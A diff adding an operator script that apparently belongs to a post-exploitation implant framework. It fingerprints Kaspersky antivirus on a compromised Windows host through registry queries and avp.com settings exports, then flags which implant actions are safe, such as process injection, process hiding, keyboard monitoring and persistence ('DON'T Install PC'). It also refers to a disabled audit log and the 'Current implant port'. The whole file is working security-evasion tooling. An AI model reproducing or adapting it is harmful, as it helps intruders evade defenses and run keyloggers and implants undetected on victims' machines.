@@ -1,0 +1,1192 @@
+#-----------------------------------------------------------------------------
+# File: PSP\kaspersky.eps
+# Description: Checks Kaspersky settings via avp.com
+#
+# Currently no FW (Anti_Hacker) queries
+#
+# This script handles the following Kaspersky versions:
+#	6.0 - KIS, KAV, FM
+#	7.0 - KIS, KAV, FM
+#	8.0 - very limited, only performs versioning.  no settings are queried
+#
+# 2008-07-08 - First Release
+# 2008-08-08 - Added a lot more error checking
+#              Background checksum of avp.com
+#              Failout if avp.exe not in ps (After initial reg queries)
+# 2008-08-20 - Re-introduced some inline registry queries to check for
+#                unmatched settinsg (reg vs. avp.com).
+#              Detects klnagent.exe and pulls the server ip
+# 2008-11-14 - removed env safeties for KAV file server
+#                added ability to handle KAVFSEE (file server enterprise edition)
+#-----------------------------------------------------------------------------
+
+@include "PerlFunctions.epm";
+@include "PSPHelpers.epm";
+@include "_NormalizePath.epm";
+@include "_ProcessList.epm";
+
+bool $debug = false;
+if($argc != 1) { echo "DEBUG: ON"; $debug = true; }
+
+# return value
+string $ret;
+
+# The struct is defined in PSPHelpers.epm
+metaData @metaData;
+string %envs;
+#initialize the struct
+init(@metaData, %envs);
+%envs{'noProcInfo'} = "FALSE";
+
+@metaData.$vendor = "Kaspersky";
+
+echo "Starting Kaspersky check";
+@echo off;
+
+string $auditing = GetEnv("AUDITOFF");
+if ($auditing == "TRUE"){
+		echo "Verified auditing was off/has been dorked. Moving on";
+}else{
+	echo "auditing still on!";
+}
+# will be set below with product type info
+string $tempFile = "~klset.txt";
+
+# Dataroot Directory (e.g., logs directory)
+string $dataroot = "";
+
+# Report Directory where log files are stored
+string $report = "";
+
+# Quarantine Directory
+string $quarantine = "";
+
+# Product Root (e.g., installation directory)
+string $productRoot = "";
+
+string $productType = "";
+int $version = 6;
+
+# Registry query value
+string $value;
+
+# registry query (sub)key
+string $key;
+
+# registry query base (used in conjuction with $key)
+string $reg_base = "";
+
+# Informational string about the settings of the box
+string $data = "";
+
+string $scriptsPath = GetEnv("ScriptsDir");
+_NormalizePath($scriptsPath);
+
+# Is this an MP4 release
+bool $mp4 = false;
+
+@record on;
+if (`regquery -hive L -subkey "software\\kasperskylab\\protected\\AVP80"`) {
+	undef($ret);
+	undef($value);
+	$key = "software\\kasperskylab\\protected\\AVP80\\environment";
+	$value[0] = "ProductName";
+	$value[1] = "ProductVersion";
+	$value[2] = "ProductType";
+
+	if(reg_query($key, $value, $ret, true))
+	{
+		echo "";
+		$productType = $ret[2];
+	}
+	else
+	{
+		if(query_failed())
+		{
+			@metaData.$information = $data;
+			writeData(@metaData, %envs);
+			return true;
+		}
+	}
+	$version = 6;
+	$mp4 = true;
+	$reg_base = "software\\kasperskylab\\protected\\AVP80";
+	string $productString = "Kaspersky Anti-Virus 6.0";
+	if ($productType == "wks") {
+		$productString = "$productString for Windows Workstations MP4";
+	} else if ($productType == "fs") {
+		$productString = "$productString for Windows Servers MP4";
+	} else {
+		$productString = "$productString MP4";
+	}
+	echo "";
+	echo "Product Name: $productString";
+	echo " *** Not original KAV 6.0.  This was released late 2009 *** ";
+	@metaData.$product = $productString;
+	@metaData.$version = "6.0.4";
+}
+else if(`regquery -hive L -subkey "software\\kasperskylab\\AVP6"`)
+{
+	echo "Found registry keys for Kaspersky 6.0.";
+	$version = 6;
+	$reg_base = "software\\kasperskylab\\AVP6";
+	@metaData.$product = "Kaspersky 6.0";
+	@metaData.$version = "6";
+}
+else if(`regquery -hive L -subkey "software\\kasperskylab\\protected\\AVP7"`)
+{
+	echo "Found registry keys for Kaspersky 7.0.";
+	$version = 7;
+	$reg_base = "software\\kasperskylab\\protected\\AVP7";
+	@metaData.$product = "Kaspersky 7.0";
+	@metaData.$version = "7";
+
+	@record on;
+	`getnetaddr`;
+	@record off;
+	int $remote_peer_port = GetCmdData("remote_peer_port");
+	int $remote_port = GetCmdData("remote_port");
+	echo "";
+	echo "NOTE: Kaspersky 7 *can* create popups for traffic over \"encrypted\" ports.";
+	echo "If you're using one of these ports (including 443)...";
+	echo "you may already be in trouble.";
+	echo "    Remote peer port: $remote_peer_port";
+	echo "Current implant port: $remote_port";
+}
+else if(`regquery -hive L -subkey "software\\kasperskylab\\KAVFSEE\\6.0"`)
+{
+	#echo "Found registry keys for Kaspersky Anti-Virus 6.0 for Windows File Servers Enterprise Edition";
+	$version = 6;
+	@metaData.$product = "Kaspersky Anti-Virus 6.0 for Windows File Servers Enterprise Edition";
+	@metaData.$version = "6";
+
+	undef($ret);
+	undef($value);
+	$key = "software\\kasperskylab\\Components\\34\\Connectors\\KAVFSEE\\6.0.0.0";
+	$value[0] = "ProdDisplayName";
+	$value[1] = "ProdVersion";
+
+	if(reg_query($key, $value, $ret, true))
+	{
+		echo "";
+		echo "Product Name: $ret[0]";
+		$productType = "fsee";
+		echo "Product Type: $productType";
+		echo "     Version: $ret[1]";
+	}
+	else
+	{
+		if(query_failed())
+		{
+			@metaData.$information = $data;
+			writeData(@metaData, %envs);
+			return true;
+		}
+	}
+	
+	$data = "$productType";
+	echo "";
+	echo "This Kaspersky installation is AV only.";
+	echo "";
+	%envs{'noDriver'} = "FALSE";
+	%envs{'noHide'} = "FALSE";
+	%envs{'noInject'} = "FALSE";
+	%envs{'noKeyboard'} = "FALSE";
+	%envs{'noRegistry'} = "FALSE";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return true;
+}
+else if(`regquery -hive L -subkey "software\\kasperskylab\\InstalledProducts\\Kaspersky Anti-Virus Personal"` || 
+	`regquery -hive L -subkey "software\\kasperskylab\\InstalledProducts\\Kaspersky Anti-Virus for Workstation"`)
+{
+	echo "";
+	string $values = GetCmdData("value");
+	string $data = GetCmdData("value_data");
+	string $value;
+	bool $flag = false;
+	int $i = 0;
+	foreach $value ($values)
+	{
+		if($value == "Name") { echo "   Product Name: $data[$i]"; @metaData.$product = "$data[$i]"; }
+		if($value == "Version")
+		{
+			echo "Product Version: $data[$i]";
+			$version = <int>$data[$i];
+			@metaData.$version="$data[$i]";
+			$flag = true;
+		}
+		$i++;
+	}
+	string $ver = "";
+	ifnot($flag == true)
+	{
+		$i = 0;
+		string $tmp;
+		foreach $value ($values)
+		{
+			if(($value == "VersionMajor") || ($value == "VerMajor"))
+			{
+				$tmp = $data[$i];
+				remove_zeroes($tmp);
+				$version = <int>$tmp;
+				hex2dec($tmp);
+				$ver = "$tmp";
+			}
+			else if(($value == "VersionMinor") || ($value == "VerMinor"))
+			{
+				$tmp = $data[$i];
+				remove_zeroes($tmp);
+				hex2dec($tmp);
+				$ver = "$ver.$tmp";
+			}
+			else if(($value == "VersionBuild") || ($value == "VerBuild"))
+			{
+				$tmp = $data[$i];
+				remove_zeroes($tmp);
+				hex2dec($tmp);
+				$ver = "$ver.$tmp";
+			}
+			$i++;
+		}
+		echo "Product Version: $ver";
+	}
+
+	echo "";
+
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return true;
+}
+else if(`regquery -hive L -subkey "software\\kasperskylab\\protected\\AVP8"`)
+{
+	echo "Found registry keys for Kaspersky 8.0 (aka Kaspersky 2009).";
+	$version = 8;
+	$reg_base = "software\\kasperskylab\\protected\\AVP8";
+	@metaData.$product = "Kaspersky 8.0";
+	@metaData.$version = "8";
+}
+else if (`regquery -hive L -subkey "software\\kasperskylab\\protected\\AVP9"`)
+{
+echo "Found registry keys for Kaspersky 9.0 (aka Kaspersky 2010).";
+	$version = 9;
+	$reg_base = "software\\kasperskylab\\protected\\AVP9";
+	@metaData.$product = "Kaspersky 9.0";
+	@metaData.$version = "9";
+}
+else
+{
+	echo "Did not find a known Kaspersky installation.";
+	echo "";
+	if(prompt "Do you want to recursively dump HKLM\\Software\\KasperskyLab? (NOTE: this can produce a large result set)")
+	{
+		@echo on;
+		`background log regquery -recursive -hive L -subkey "software\\kasperskylab"`;
+		@echo off;
+	}
+
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return false;
+}
+
+
+
+# Environment
+undef($ret);
+undef($value);
+$key = "$reg_base\\environment";
+
+if($version < 8)
+{
+	$value[0] = "Components";
+	$value[1] = "DataRoot";
+	$value[2] = "ProductName";
+	$value[3] = "ProductRoot";
+	$value[4] = "ProductType";
+	$value[5] = "ProductVersion";
+	$value[6] = "Quarantine";
+	$value[7] = "Report";
+}
+else
+{
+	$value[0] = "Build";
+	$value[1] = "DataRoot";
+	$value[2] = "ProductName";
+	$value[3] = "ProductRoot";
+	$value[4] = "ProductType";
+	$value[5] = "ProductVersion";
+	$value[6] = "Quarantine";
+	$value[7] = "Report";
+}
+if(reg_query($key, $value, $ret, true))
+{
+	echo "";
+	echo "Product Name: $ret[2]";
+	$productType = $ret[4];
+	echo "Product Type: $productType";
+	echo "     Version: $ret[5]";
+	if($version < 8) { echo "  Components: $ret[0]"; }
+	echo "";
+	$dataroot = $ret[1];
+	$report = $ret[7];
+
+	string $r = split("\%\\", $report);
+	$report = "$dataroot\\$r[1]";
+
+	$quarantine= $ret[6];
+	$r = split("\%\\", $quarantine);
+	$quarantine = "$dataroot\\$r[1]";
+
+	$productRoot = "$ret[3]";
+	_NormalizePath($productRoot);
+	
+	$tempFile = "~kl$ret[4]set.txt";
+
+	#pause;
+}
+else
+{
+	if(query_failed())
+	{
+		@metaData.$information = $data;
+		writeData(@metaData, %envs);
+		return true;
+	}
+}
+@metaData.$product = "$ret[2] ($ret[4])";
+@metaData.$version = "$ret[5]";
+@metaData.$logFile = "$report";
+@metaData.$quarantine = "$quarantine";
+$data = "$productType";
+string $components = "$ret[0]";
+replace($components, ";", ",");
+if($version < 8) { $data = "$data|Components:$components"; }
+
+if($productType == "fs")
+{
+	echo "This Kaspersky installation is AV only.";
+	echo "Verify by checking the Components list above.";
+	echo "";
+	%envs{'noDriver'} = "FALSE";
+	%envs{'noHide'} = "FALSE";
+	%envs{'noInject'} = "FALSE";
+	%envs{'noKeyboard'} = "FALSE";
+	%envs{'noRegistry'} = "FALSE";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return true;
+}
+
+int $ids;
+string $names;
+ifnot(_GetProcessList($ids, $names))
+{
+	echo "Error getting process list.";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return false;
+}
+
+string $name;
+string $inList = "false";
+foreach $name ($names)
+{
+	if($name == "klnagent.exe" || $name == "KLNAGENT.EXE") { $inList = "true"; break; }
+}
+if($inList == "true")
+{
+	echo "Target is part of the Kaspersky Administration Kit.";
+
+	undef($ret);
+	undef($value);
+	string $settingsKey = SplitPath($reg_base);
+	$key = "$settingsKey\\Components\\34";
+	$value[0] = "SS_SETTINGS";
+	if(reg_query($key, $value, $ret, true))
+	{
+		#echo "Settings file: $ret[0]";
+		if(prompt "Do you want to retrieve the klnaggent settings file (to retrieve the server IP)?")
+		{
+			ifnot(`get "$ret[0]" -foreground`)
+			{
+				echo "Error getting \"$ret[0]\"";
+				echo "";
+			}
+			else
+			{
+				string $settingsFile = SplitPath("$ret[0]");
+				undef($ret);
+				getLastFile($settingsFile[1], $ret);
+
+				@record on;
+				`local run -command "perl $scriptsPath\\PSP\\kl_settings_parser.pl $ret" -redirect`;
+				@record off;
+				string $kl_server_ip = GetCmdData("output");
+				echo "Kaspersky Administration Server IP: $kl_server_ip";
+			}
+		}
+		echo "";
+	}
+	else
+	{
+		if(query_failed())
+		{
+			@metaData.$information = $data;
+			writeData(@metaData, %envs);
+			return true;
+		}
+	}
+
+}
+
+ifnot(prompt "Continue")
+{
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return false;
+}
+
+
+
+$name;
+$inList = "false";
+foreach $name ($names)
+{
+	if($name == "avp.exe" || $name == "AVP.EXE") { $inList = "true"; break; }
+}
+if($inList == "false")
+{
+	echo "";
+	echo "avp.exe not found in the process list";
+	echo "";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return false;
+}
+
+
+
+echo "";
+echo "Checking for avp.com ...";
+@record on;
+`dir "$productRoot\\avp.com"`;
+@record off;
+string $tmp = getCmdData("name");
+ifnot(defined($tmp))
+{
+	echo "Could not find avp.com";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return false;
+}
+else
+{
+	echo "Found avp.com in the following folder:";
+	echo "$productRoot";
+}
+
+echo "";
+@echo on;
+`fileperms -file "$productRoot\\avp.com"`;
+@echo off;
+
+echo "Check to make sure you have permissions to run this file";
+ifnot(prompt "Continue")
+{
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return false;
+}
+
+# Touch/Checksum avp.com for backtracking purposes
+@record on;
+`checksum -mask avp.com -path "$productRoot"`;
+@record off;
+string $checksum = GetCmdData("checksum_value");
+ifnot(defined($checksum))
+{
+	echo "\nError checksumming \"$productRoot\\avp.com\"\n";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return false;
+}
+#echo "md5(avp.com): $checksum";
+
+
+#string $tempPath = "$report\\..\\..";
+string $tempPath = GetEnv("tmppath");
+_NormalizePath($tempPath);
+
+
+echo "";
+echo "Do you want to dump Kaspersky settings to:";
+echo "\"$tempPath\\$tempFile\"";
+echo "This involves the following run -command:";
+echo "";
+echo "----------";
+echo "run -command \"\\\"$productRoot\\avp.com\\\" export rtp \\\"$tempPath\\$tempFile\\\"\"";
+echo "----------";
+echo "";
+echo "!!! WARNING: If Kaspersky (avp.exe) is not in the process list, get help!";
+echo "";
+echo "The result is usually >200K.";
+echo "Also, additional registry queries will be run, some may take while.";
+echo "";
+if(prompt "")
+{
+	echo "";
+	echo "Dumping Kaspersky settings ...";
+	#@echo on;
+	ifnot(`run -command "\\"$productRoot\\avp.com\\" export rtp \\"$tempPath\\$tempFile\\""`)
+	{
+		echo "Error when trying to run:";
+		echo "\trun -command \"$productRoot\\avp.com\" export rtp \"$tempPath\\$tempFile\"";
+		@echo off;
+		echo "Listing \"$productRoot\"";
+		`dir * -path "$productRoot" -recursive -max 0`;
+		echo "Listing \"$dataRoot\"";
+		`dir * -path "$dataRoot" -recursive -max 0`;
+		@metaData.$information = $data;
+		writeData(@metaData, %envs);
+		return false;
+
+	}
+
+	echo "Getting \"$tempFile\" ...";
+	ifnot(`get "$tempPath\\$tempFile" -foreground`)
+	{
+		echo "Error getting \"$tempPath\\$tempFile\"";
+		echo "";
+		@echo on;
+		`dir * -path "$tempPath"`;
+		@echo off;
+		echo "";
+		echo "Check for $tempFile and delete if it exists:";
+		echo "";
+		@metaData.$information = $data;
+		writeData(@metaData, %envs);
+		return false;
+	}
+
+	echo "Deleting \"$tempFile\" ...";
+	ifnot(`del "$tempFile" -path "$tempPath"`)
+	{
+		echo "Error deleting \"$tempPath\\$tempFile\"";
+		echo "";
+		@echo on;
+		`dir * -path "$tempPath"`;
+		@echo off;
+		echo "";
+		echo "Check for $tempFile and delete if it exists:";
+		echo "";
+		@metaData.$information = $data;
+		writeData(@metaData, %envs);
+		return false;
+		
+	}
+}
+
+echo "";
+@echo on;
+`dir "$tempFile" -path "$tempPath"`;
+@echo off;
+
+echo "";
+
+undef($ret);
+getLastFile($tempFile, $ret);
+
+#string $scriptsPath = GetEnv("ScriptsDir");
+#_NormalizePath($scriptsPath);
+$scriptsPath = "$scriptsPath\\PSP";
+
+@record on;
+if ($mp4) {
+	`local run -command "perl $scriptsPath\\kaspersky_mp4.pl $ret" -redirect`;
+} else {
+	`local run -command "perl $scriptsPath\\kaspersky.pl $ret" -redirect`;
+}
+@record off;
+$ret = GetCmdData("output");
+
+string $results = split("\t", $ret);
+
+echo "hello ...";
+
+if($version == 8)
+{
+	echo "Settings have been pulled back.";
+	echo "No parsing done.";
+	echo "Recommend checking guidance.";
+	echo "";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return true;
+}
+if ($version == 9)
+{
+	echo "Settings have been pulled back.";
+	echo "No parsing done.";
+	echo "Recommend checking guidance.";
+	echo "";
+	@metaData.$information = $data;
+	writeData(@metaData, %envs);
+	return true;
+}
+
+string $pdm_base;
+if ($mp4) {
+	$pdm_base = "$reg_base\\profiles\\behavior_blocking2\\profiles\\pdm2";
+} else {
+	$pdm_base = "$reg_base\\profiles\\behavior_blocking\\profiles\\pdm";
+}
+
+
+echo "==================== avp.com results ====================";
+echo "hello ....";
+echo "Product Name: $results[0]";
+echo "     Version: $results[1]";
+echo "Install Path: $results[2]";
+echo "";
+
+if($results[3] == "no")
+{
+	undef($ret);
+	undef($value);
+	$key = "$reg_base";
+	$value[0] = "enabled";
+
+	if(reg_query($key, $value, $ret, true))
+	{
+		if($ret[0] != "00000000") {	mismatchError("Kaspersky Protection"); }
+		else
+		{
+			echo "Kaspersky Protection: OFF (made in the shade)";
+			echo "";
+			$data = "$data|Protection:OFF";
+			%envs{'noDriver'} = "FALSE";
+			%envs{'noHide'} = "FALSE";
+			%envs{'noInject'} = "FALSE";
+			%envs{'noKeyboard'} = "FALSE";
+			%envs{'noRegistry'} = "FALSE";
+		}
+	}
+	else
+	{
+		if(query_failed())
+		{
+			@metaData.$information = $data;
+			writeData(@metaData, %envs);
+			return true;
+		}
+	}
+}
+else
+{
+	echo "Kaspersky Protection: ON";
+	echo "";
+	$data = "$data|Protection:ON";
+	if($results[4] == "no")
+	{
+		undef($ret);
+		undef($value);
+		if ($mp4) {
+			$key = "$reg_base\\profiles\\Behavior_Blocking2";
+		} else {
+			$key = "$reg_base\\profiles\\behavior_blocking";
+		}
+		$value[0] = "enabled";
+
+		if(reg_query($key, $value, $ret, true)) 
+		{
+			if($ret[0] != "00000000") {	mismatchError("Behavior Blocking"); }
+			else
+			{
+				echo "Behavior Blocking: OFF";
+				$data = "$data|BehaviorBlocking:OFF";
+				%envs{'noDriver'} = "FALSE";
+				%envs{'noHide'} = "FALSE";
+				%envs{'noInject'} = "FALSE";
+				%envs{'noKeyboard'} = "FALSE";
+				%envs{'noRegistry'} = "FALSE";
+			}
+		}
+		else
+		{
+			if(query_failed())
+			{
+				@metaData.$information = $data;
+				writeData(@metaData, %envs);
+				return true;
+			}
+		}
+	}
+	else
+	{
+		$data = "$data|BehaviorBlocking:ON";
+		echo "Behavior Blocking: ON";
+
+		if($results[22] == "no")
+		{
+			#################################################################
+			# This will fail under MP4 as I don't yet understand the settings
+			#################################################################
+			undef($ret);
+			undef($value);
+			$key = "$reg_base\\profiles\\behavior_blocking\\profiles\\pdm\\settings";
+			$value[0] = "bBehaviourEnabled";
+			if(reg_query($key, $value, $ret, true)) 
+			{
+				if($ret[0] != "00000000") {	mismatchError("Application Activity Analyzer"); }
+				else
+				{
+					echo "\tApplication Activity Analyzer: OFF";
+					$data = "$data|ApplicationActivityAnalyzer:OFF";
+				}
+			}
+			else
+			{
+				if(query_failed())
+				{
+					@metaData.$information = $data;
+					writeData(@metaData, %envs);
+					return true;
+				}
+			}
+		}
+		else
+		{
+			echo "\tApplication Activity Analyzer: ON";
+			$data = "$data|ApplicationActivityAnalyzer:ON";
+
+			if($results[5] == "no")
+			{
+				undef($ret);
+				undef($value);
+				$key = "$pdm_base\\settings\\Set\\0000";
+				$value[0] = "bEnabled";
+				if(reg_query($key, $value, $ret, true)) 
+				{
+					if($ret[0] != "00000000") {	mismatchError("Dangerous Behavior"); }
+					else
+					{
+						echo "\t\tDangerous Behavior: OFF";
+						$data = "$data|DangerousBehavior:OFF";
+						%envs{'noRegistry'} = "FALSE";
+						%envs{'noDriver'} = "FALSE";
+					}
+				}
+				else
+				{
+					if(query_failed())
+					{
+						@metaData.$information = $data;
+						writeData(@metaData, %envs);
+						return true;
+					}
+				}
+			}
+			else
+			{
+				$data = "$data|DangerousBehavior:ON";
+				echo "\t\tDangerous Behavior: ON (DON'T Write to services key)";
+				#SetEnv("noRegistry","TRUE");
+				%envs{'noRegistry'} = "TRUE";
+				%envs{'noDriver'} = "TRUE";
+				undef($ret);
+				bbAction($results[6], $ret);
+				echo "$ret";
+				$data = "$data|DangerousBehaviorAction:$results[6]";
+				echo "\t\t\tLogging: $results[7]";
+				$data = "$data|DangerousBehaviorLogging:$results[7]";
+				echo "\t\t\tQuarantine: $results[8]";
+				$data = "$data|DangerousBehaviorQuarantine:$results[8]";
+			}
+
+			if($results[9] == "no")
+			{
+				undef($ret);
+				undef($value);
+				$key = "$pdm_base\\settings\\Set\\0002";
+				$value[0] = "bEnabled";
+				if(reg_query($key, $value, $ret, true)) 
+				{
+					if($ret[0] != "00000000") {	mismatchError("Process Injection"); }
+					else
+					{
+						echo "\t\tProcess Injection Detection: OFF";
+						$data = "$data|ProcessInjection:OFF";
+						%envs{'noInject'} = "FALSE";
+					}
+				}
+				else
+				{
+					if(query_failed())
+					{
+						@metaData.$information = $data;
+						writeData(@metaData, %envs);
+						return true;
+					}
+				}
+			}
+			else
+			{
+				$data = "$data|ProcessInjection:ON";
+				echo "\t\tProcess Injection Detection: ON (DON'T Process inject)";
+				#SetEnv("noInject","TRUE");
+				%envs{'noInject'} = "TRUE";
+				undef($ret);
+				bbAction($results[10], $ret);
+				echo "$ret";
+				$data = "$data|ProcessInjectionAction:$results[10]";
+				echo "\t\t\tLogging: $results[11]";
+				$data = "$data|ProcessInjectionLogging:$results[11]";
+				echo "\t\t\tQuarantine: $results[12]";
+				$data = "$data|ProcessInjectionQuarantine:$results[12]";
+			}
+			if($results[13] == "no")
+			{
+				undef($ret);
+				undef($value);
+				$key = "$pdm_base\\settings\\Set\\0003";
+				$value[0] = "bEnabled";
+				if(reg_query($key, $value, $ret, true)) 
+				{
+					if($ret[0] != "00000000") {	mismatchError("Process Hiding"); }
+					else
+					{
+						echo "\t\tProcess Hiding Detection: OFF";
+						$data = "$data|ProcessHiding:OFF";
+						%envs{'noHide'} = "FALSE";
+					}
+				}
+				else
+				{
+					if(query_failed())
+					{
+						@metaData.$information = $data;
+						writeData(@metaData, %envs);
+						return true;
+					}
+				}
+			}
+			else
+			{
+				$data = "$data|ProcessHiding:ON";
+				echo "\t\tProcess Hiding Detection: ON (DON't Process Hide)";
+				#SetEnv("noHide","TRUE");
+				%envs{'noHide'} = "TRUE";
+				undef($ret);
+				bbAction($results[14], $ret);
+				echo "$ret";
+				$data = "$data|ProcessHidingAction:$results[14]";
+				echo "\t\t\tLogging: $results[15]";
+				$data = "$data|ProcessHidingLogging:$results[15]";
+				echo "\t\t\tQuarantine: $results[16]";
+				$data = "$data|ProcessHidingQuarantine:$results[16]";
+			}
+			ifnot($productType == "kav")
+			{
+				if($results[17] == "no")
+				{
+					undef($ret);
+					undef($value);
+					$key = "$pdm_base\\settings\\Set\\0007";
+					$value[0] = "bEnabled";
+					if(reg_query($key, $value, $ret, true)) 
+					{
+						if($ret[0] != "00000000") {	mismatchError("Keylogger Detection"); }
+						else
+						{
+							echo "\t\tKeylogger Detection: OFF";
+							$data = "$data|KeyloggerDetection:OFF";
+							%envs{'noKeyboard'} = "FALSE";
+						}
+					}
+					else
+					{
+						if(query_failed())
+						{
+							@metaData.$information = $data;
+							writeData(@metaData, %envs);
+							return true;
+						}
+					}
+				}
+				else
+				{
+					$data = "$data|KeyloggerDetection:ON";
+					echo "\t\tKeyLogger Detection: ON (DON'T Monitor the keyboard)";
+					#SetEnv("noKeyboard","TRUE");
+					%envs{'noKeyboard'} = "TRUE";
+					undef($ret);
+					bbAction($results[18], $ret);
+					echo "$ret";
+					$data = "$data|KeyloggerDetectionAction:$results[18]";
+					echo "\t\t\tLogging: $results[19]";
+					$data = "$data|KeyloggerDetectionLogging:$results[19]";
+					echo "\t\t\tQuarantine: $results[20]";
+					$data = "$data|KeyloggerDetectionQuarantine:$results[20]";
+				}
+			}
+		}
+
+		undef($ret);
+		undef($value);
+		$key = "$reg_base\\profiles\\behavior_blocking\\profiles\\pdm\\settings";
+		$value[0] = "bAppMonitoring_Enabled";
+		$value[1] = "bRegMonitoring_Enabled";
+		string $appMonitoring = "";
+		string $regMonitoring = "";
+		# Don't see these here in MP4...
+		# Reg guard settings controlled by software\kasperskylab\protected\AVP80\profiles\Behavior_Blocking2\profiles\regguard2  enabled
+		ifnot($mp4) {
+			if(reg_query($key, $value, $ret, true))
+			{
+				$appMonitoring = "$ret[0]";
+				$regMonitoring = "$ret[1]";
+			}
+			else
+			{
+				if(query_failed())
+				{
+					@metaData.$information = $data;
+					writeData(@metaData, %envs);
+					return true;
+				}
+			}
+		} 
+
+		if($results[30] == "no")
+		{
+			if($appMonitoring != "00000000") {	mismatchError("Application Integrity Control"); }
+			else
+			{
+				echo "\tApplication Integrity Control: OFF";
+				$data = "$data|ApplicationIntegrityControl:OFF";
+			}
+		}
+		else
+		{
+			echo "\tApplication Integrity Control: ON (DON't Install PC)";
+			$data = "$data|ApplicationIntegrityControl:ON";
+		}
+
+		if($results[21] == "no")
+		{
+			if($regMonitoring != "00000000") {	mismatchError("Registry Guard"); }
+			else
+			{
+				echo "\tRegistry Guard: OFF";
+				$data = "$data|RegistryGuard:OFF";
+				%envs{'noRegistry'} = "FALSE";
+			}
+		}
+		else
+		{
+			$data = "$data|RegistryGuard:ON"; 
+			#SetEnv("noRegistry","TRUE");
+			%envs{'noRegistry'} = "TRUE";
+			echo "\tRegistry Guard: ON (DON'T Install PC)";
+			echo "\t\t!!! Losing connection will probably cause a popup !!!";
+			echo "\t\t!!!      Make sure you know what you're doing     !!!";
+			echo "\t\t!!!                Check guidance!                !!!";
+		}
+	}
+
+	if($results[23] == "no")
+	{
+			#if($results[17] == "no")
+			#{
+				undef($ret);
+				undef($value);
+				$key = "$reg_base\\profiles\\File_Monitoring";
+				$value[0] = "enabled";
+				if(reg_query($key, $value, $ret, true)) 
+				{
+					if($ret[0] != "00000000") {	mismatchError("File Monitoring"); }
+					else
+					{
+						echo "File Monitor: OFF";
+						$data = "$data|FileMonitoring:OFF";
+					}
+				}
+				else
+				{
+					if(query_failed())
+					{
+						@metaData.$information = $data;
+						writeData(@metaData, %envs);
+						return true;
+					}
+				}
+			#}
+	}
+	else
+	{
+		$data = "$data|FileMonitoring:ON";
+		echo "File Monitor: ON";
+
+		if($results[24] == "00000000") { echo "\tLevel: $results[24] (Default|Recommended)"; }
+		if($results[24] == "00000002") { echo "\tLevel: $results[24] (Low)"; }
+		if($results[24] == "00000003") { echo "\tLevel: $results[24] (High)"; }
+
+		$data = "$data|FileMonitoringLevel:$results[24]";
+		echo "\tScan Packed: $results[25]";
+		$data = "$data|FileMonitoringScanPacked:$results[25]";
+		echo "\tScan Action: $results[26]";
+		$data = "$data|FileMonitoringScanAction:$results[26]";
+		echo "\tDisinfect: $results[27]";
+		$data = "$data|FileMonitoringDisinfect:$results[27]";
+		Echo "\tDelete: $results[28]";
+		$data = "$data|FileMonitoringDelete:$results[28]";
+		echo "\tDelete Container: $results[29]";
+		$data = "$data|FileMonitoringDeleteContainer:$results[29]";
+	}
+}
+
+echo "";
+echo "=========================================================";
+echo "";
+
+
+@metaData.$information = $data;
+writeData(@metaData, %envs);
+
+if($debug)
+{
+	echo "";
+	echo "";
+	echo "";
+	string $result;
+	int $i = 0;
+	foreach $result ($results)
+	{
+		echo "$i --- $result";
+		$i++;
+	}
+	echo "";
+	echo "";
+	foreach $result (keys %envs)
+	{
+		echo "$result: %envs{'$result'}";
+	}
+}
+
+return true;
+
+sub writeData(IN metaData @metaData, IN string %envs)
+{
+	if(writeMetaData(@metaData, %envs)){
+		echo "Wrote meta data to disk";
+	}else{
+		echo "ERROR. could not write meta data to disk. ERROR";
+	}
+	return true;
+}
+
+
+sub bbAction(IN string $data, REF string $ret)
+{
+	$ret = "\t\t\tAction: $data";
+	string %translations;
+	%translations{'00000000'} = "$ret (ALLOWED)";
+	%translations{'00000001'} = "$ret (ASK USER)";
+	%translations{'00000003'} = "$ret (TERMINATE/BLOCK)";
+
+	string $key;
+	foreach $key (keys %translations)
+	{
+		if($data == $key) { $ret = "%translations{'$key'}"; break; }
+	}
+
+	return true;
+}
+
+
+# Search through the GetFilse directory for the settings dump
+# Returns the more recent settinsg dump
+sub getLastFile(IN string $tempFile, REF string $ret)
+{
+	@record on;
+	`getdirectory -logs`;
+	@record off;
+	string $dir = GetCmdData("dir");
+	@echo off;
+
+	@record on;
+	`local dir $tempFile* -path $dir\\Get_Files`;
+	@record off;
+	string $filePath = GetCmdData("path");
+	string $fileName = GetCmdData("name");
+
+	_NormalizePath($filePath[0]);
+
+	string $currPath;
+	string $currName;
+
+	int $i = 0;
+
+	while(defined($fileName[$i]))
+	{
+		$currPath = $filePath[$i];
+		$currName = $fileName[$i];
+		$i++;
+	}
+	@echo on;
+	`local mkdir "$currPath\\NOSEND"`;
+	`local move "$currPath\\$currName" "$currPath\\NOSEND\\$currName"`;
+	@echo off;
+	$ret = "$currPath\\NOSEND\\$currName";
+
+	return true;
+}
+
+# Failure case if regquery fails
+sub query_failed()
+{
+	echo "";
+	echo "Registry query failure";
+	echo "";
+
+	if(prompt "Do you want to recursively dump HKLM\\Software\\KasperskyLab?\n(NOTE: this can produce a large result set)")
+	{
+		@echo on;
+		`background log regquery -recursive -hive L -subkey "software\\kasperskylab"`;
+		@echo off;
+	}
+	if(prompt "Do you want to exit")
+	{
+		return true;
+	}
+	return false;
+}
+
+# Remove preceeding zeros from a string
+sub remove_zeroes(REF string $data)
+{
+	string $split = split("0", $data);
+	undef($data);
+	$data = "0";
+	string $tmp;
+	foreach $tmp ($split)
+	{
+		if($tmp != "") { $data = $tmp; break; }
+	}
+	return true;
+}
+
+# Output error message if settings from avp.com and the registry do not match
+sub mismatchError(IN string $category)
+{
+	echo "";
+	echo "**********!!!!!!!!!!**********";
+	echo "Settings from avp.com don't match the registry for \"$category\".";
+	echo "Assume that \"$category\" is ON";
+	echo "You should probably get help.";
+	echo "**********!!!!!!!!!!**********";
+	echo "";
+	return true;
+}
+
